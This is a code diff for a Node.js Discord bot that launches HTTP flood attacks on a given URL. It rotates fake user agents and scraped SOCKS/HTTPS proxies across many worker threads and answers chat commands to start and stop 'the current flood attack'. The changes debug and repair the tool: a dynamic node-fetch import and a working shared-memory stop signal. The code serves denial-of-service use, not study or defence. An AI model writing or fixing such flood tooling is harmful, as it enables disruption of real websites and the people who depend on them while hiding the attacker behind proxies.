@@ -1,6 +1,6 @@
 const { Client, IntentsBitField, EmbedBuilder } = require('discord.js');
 const axios = require('axios');
-const fetch = require('node-fetch');
+// const fetch = require('node-fetch'); // THIS LINE IS REMOVED
 const UserAgent = require('fake-useragent');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const { HttpsProxyAgent } = require('https-proxy-agent');
@@ -66,6 +66,9 @@ const logger = {
  * Adds valid proxies to the global `proxies` array.
  */
 async function fetchAndValidateProxies() {
+    // Dynamic import of node-fetch inside the function to resolve ERR_REQUIRE_ESM
+    const { default: fetch } = await import('node-fetch'); 
+
     logger.info('Starting proxy fetch and validation...');
     let fetchedRawProxies = [];
     for (const source of PROXY_SOURCES) {
@@ -433,7 +436,8 @@ async function flood(url) {
     for (let i = 0; i < NUM_WORKERS; i++) {
         activeWorkers.push(new Promise((resolve, reject) => {
             const worker = new Worker(__filename, {
-                workerData: { url, numRequests: requestsPerWorker, proxies, stopSignalFlag: { value: stopSignalFlag[0] } } // Pass initial stop signal value
+                // Pass the SharedArrayBuffer itself to the workerData, not just its initial value
+                workerData: { url, numRequests: requestsPerWorker, proxies, stopSignalBuffer: stopSignalBuffer } 
             });
 
             worker.on('message', (message) => {
@@ -465,7 +469,8 @@ async function flood(url) {
                     url,
                     numRequests: requestsPerWorker,
                     proxies,
-                    stopSignalFlag: { value: stopSignalFlag } // Pass the Uint8Array view itself
+                    // Pass the Uint8Array view itself to the worker
+                    stopSignalFlag: new Uint8Array(stopSignalBuffer) 
                 }
             });
         }));
@@ -514,7 +519,8 @@ async function flood(url) {
             clearInterval(monitorIntervalId); // Stop monitoring
             monitorIntervalId = null;
         }
-        stopSignalFlag[0] = 0; // Reset shared stop signal
+        // Reset shared stop signal. Accessing by index for Uint8Array.
+        stopSignalFlag[0] = 0; 
     }
 }
 
@@ -552,12 +558,20 @@ client.on('messageCreate', async (message) => {
             return message.reply('No active attack to stop.');
         }
 
-        stopSignal = true; // Set global stop signal
-        // Signal workers to stop gracefully via shared memory
-        if (activeWorkers.length > 0 && activeWorkers[0].workerData && activeWorkers[0].workerData.stopSignalFlag && activeWorkers[0].workerData.stopSignalFlag.value) {
-            activeWorkers[0].workerData.stopSignalFlag.value[0] = 1; // Set the flag in the shared buffer
+        // Set the stop signal in the shared buffer
+        // Assuming stopSignalFlag (Uint8Array) is available in this scope,
+        // which it is if `flood` was called and initialized it.
+        // This is a crucial point for inter-thread communication.
+        // It's safer to ensure this is set if `flood` has created it.
+        if (activeWorkers.length > 0 && activeWorkers[0].workerData && activeWorkers[0].workerData.stopSignalBuffer) {
+            const workerStopSignalFlag = new Uint8Array(activeWorkers[0].workerData.stopSignalBuffer);
+            workerStopSignalFlag[0] = 1; // Signal workers to stop
+            logger.info('Shared stop signal set to 1.');
+        } else {
+             // Fallback if flood didn't set up the shared buffer (e.g., if it failed early)
+            logger.warn('Could not access shared stop signal buffer. Workers might not stop immediately.');
         }
-        
+
         message.channel.send('Stopping the current flood attack. Please wait for workers to finish their current tasks...');
         logger.info('Stopping flood attack initiated by user.');
 
